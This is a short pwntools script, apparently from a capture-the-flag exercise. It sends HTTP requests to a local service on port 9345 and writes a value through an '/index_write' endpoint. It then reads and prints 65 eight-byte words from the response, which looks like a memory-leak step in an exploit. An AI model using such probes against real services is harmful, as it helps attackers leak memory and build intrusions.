from pwn import *

p = remote ('localhost', 9345)
p.sendline('GET /form HTTP/1.1\r\n')
p.close()

p = remote ('localhost', 9345)
p.sendline('GET /index_write HTTP/1.1\r\n')
p.recvuntil('Index: ')
p.sendline('2')
p.recvuntil('Value: ')
p.sendline('F')
p.recvuntil('Current: ')

for i in range(65):
  print i, hex(u64(p.recvn(8)))

p.close()

